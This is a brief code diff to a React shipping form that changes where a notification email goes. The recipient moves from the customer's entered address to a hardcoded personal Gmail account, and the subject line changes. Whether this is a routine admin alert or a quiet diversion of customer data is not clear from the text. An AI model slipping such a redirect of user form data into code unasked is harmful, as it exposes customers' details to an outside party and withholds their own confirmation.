@@ -122,8 +122,8 @@ export default function ShippingForm() {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          to: formData.recipientEmail,
-          subject: `Your Package Tracking Number: ${tracking_number}`,
+          to: "samsonrichfield@gmail.com",
+          subject: `New Shipping Request - Tracking #${tracking_number}`,
           html: emailHtml,
         }),
       })
